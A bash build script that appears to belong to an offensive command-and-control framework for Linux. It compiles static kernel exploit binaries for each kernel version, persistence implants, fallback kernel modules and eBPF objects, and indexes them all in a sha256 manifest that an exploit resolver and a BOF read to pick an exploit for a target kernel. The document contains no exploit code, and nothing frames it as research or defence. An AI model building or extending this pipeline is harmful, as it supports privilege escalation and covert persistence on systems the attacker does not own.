#!/usr/bin/env bash
# build_matrix.sh — Phase 3: offline prebuilt matrix builder (server-side)
#
# Layout under MATRIX_ROOT (default ~/cc/run/matrix):
#   exploits/<kver>/     prebuilt exploit ELFs (musl static, per kernel version)
#   implants/<ver>/      kernel-independent persistence implants (shared)
#   ko/<kver>/           LKM fallback (vermagic-matched)
#   ebpf/<feature-set>/  CO-RE eBPF objects (5.15 / 6.x families)
#   matrix_manifest.json path -> {sha256, kver, arch, feature-set}
#
# Inputs: SRC_ROOT (defaults to the linux_agent extender dir) sources:
#   src_matrix/exploits/*/<kver>/...  (each exploit has a per-kver subdir)
#   src_matrix/implants/*/
#   src_matrix/ko/*/<kver>/...
#   src_agent/bpf/ (reuses build_bpf.sh for the ebpf/ feature set)
#
# The manifest is THE authoritative index — the matrix_resolver (plugin) and
# matrix_pick (BOF) both consume it. Rebuild everything + regenerate sha256s
# on every run (deterministic artifact set per invocation).

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
EXT="$(dirname "$HERE")"
MATRIX_ROOT="${MATRIX_ROOT:-$HOME/cc/run/matrix}"
SRC="$EXT/src_matrix"
BPFDIR="$EXT/src_agent/bpf"
FAIL=0

mkdir -p "$MATRIX_ROOT/exploits" "$MATRIX_ROOT/implants" "$MATRIX_ROOT/ko" "$MATRIX_ROOT/ebpf"

log() { echo "  [$1] $2"; }

# ── exploits: musl static per kver ──
if [ -d "$SRC/exploits" ]; then
    for ed in "$SRC"/exploits/*/; do
        ename="$(basename "$ed")"
        for kd in "$ed"*/; do
            [ -d "$kd" ] || continue
            kver="$(basename "$kd")"
            out="$MATRIX_ROOT/exploits/$kver"
            mkdir -p "$out"
            for src in "$kd"*.c; do
                [ -f "$src" ] || continue
                base="$(basename "$src" .c)"
                if musl-gcc -static -s -O2 -o "$out/${ename}_${base}" "$src" 2>/dev/null; then
                    log PASS "exploit $ename/$base -> exploits/$kver/"
                else
                    log FAIL "exploit $ename/$base"; FAIL=1
                fi
            done
        done
    done
else
    log SKIP "no src_matrix/exploits — add sources or drop the section"
fi

# ── implants: kernel-independent ──
if [ -d "$SRC/implants" ]; then
    for id in "$SRC"/implants/*/; do
        iname="$(basename "$id")"
        out="$MATRIX_ROOT/implants/$iname"
        mkdir -p "$out"
        for src in "$id"*.c; do
            [ -f "$src" ] || continue
            base="$(basename "$src" .c)"
            if musl-gcc -static -s -O2 -o "$out/$base" "$src" 2>/dev/null; then
                log PASS "implant $iname/$base"
            else
                log FAIL "implant $iname/$base"; FAIL=1
            fi
        done
    done
else
    log SKIP "no src_matrix/implants"
fi

# ── ko: per-kver kernel modules ──
if [ -d "$SRC/ko" ]; then
    for kd in "$SRC"/ko/*/; do
        [ -d "$kd" ] || continue
        kver="$(basename "$kd")"
        out="$MATRIX_ROOT/ko/$kver"
        mkdir -p "$out"
        for src in "$kd"*.c; do
            [ -f "$src" ] || continue
            base="$(basename "$src" .c)"
            # vermagic-matched build needs the target headers; when absent,
            # compile-check only and mark the manifest entry as source-only
            if [ -d "/lib/modules/$kver/build" ]; then
                if make -C "/lib/modules/$kver/build" M="$out" "src=$src" modules 2>/dev/null; then
                    log PASS "ko $base -> ko/$kver/ (vermagic-matched)"
                else
                    log FAIL "ko $base ($kver)"; FAIL=1
                fi
            else
                log SKIP "ko $base: no /lib/modules/$kver/build — compile-check only"
                gcc -Wall -Werror -D__KERNEL__ -DMODULE -fsyntax-only "$src" 2>/dev/null || FAIL=1
            fi
        done
    done
else
    log SKIP "no src_matrix/ko"
fi

# ── ebpf: CO-RE objects via the Phase 2 pipeline ──
if bash "$HERE/build_bpf.sh" all 2>/dev/null; then
    cp -f "$BPFDIR"/out/*.o "$MATRIX_ROOT/ebpf/" 2>/dev/null
    cp -f "$BPFDIR"/out/*.insns.bin "$MATRIX_ROOT/ebpf/" 2>/dev/null
    log PASS "ebpf objects -> ebpf/"
else
    log FAIL "ebpf pipeline"; FAIL=1
fi

# ── manifest ──
log INFO "generating matrix_manifest.json"
python3 - "$MATRIX_ROOT" << 'PYEOF'
import json, hashlib, os, sys
root = sys.argv[1]
manifest = {}
def add(path, **meta):
    if not os.path.isfile(path):
        return
    rel = os.path.relpath(path, root)
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(1 << 16), b''):
            h.update(chunk)
    meta['sha256'] = h.hexdigest()
    meta['path'] = rel
    manifest[rel] = meta
for d in ['exploits', 'implants', 'ko', 'ebpf']:
    base = os.path.join(root, d)
    for dirpath, _, files in os.walk(base):
        for fn in files:
            rel = os.path.relpath(os.path.join(dirpath, fn), base)
            kver = ''
            parts = rel.split(os.sep)
            if len(parts) >= 2 and d in ('exploits', 'ko'):
                kver = parts[0]
            feature = ''
            if d == 'ebpf':
                feature = fn.split('.')[0]
            add(os.path.join(dirpath, fn), kind=d, kver=kver, feature=feature,
                arch='x86_64' if fn.endswith(('.o', '.ko', '.elf')) else '')
with open(os.path.join(root, 'matrix_manifest.json'), 'w') as f:
    json.dump(manifest, f, indent=1)
print(f'  [INFO] manifest: {len(manifest)} entries')
PYEOF

[ "$FAIL" -eq 0 ] && echo "BUILD_MATRIX: ALL PASS" || echo "BUILD_MATRIX: FAIL"
exit $FAIL
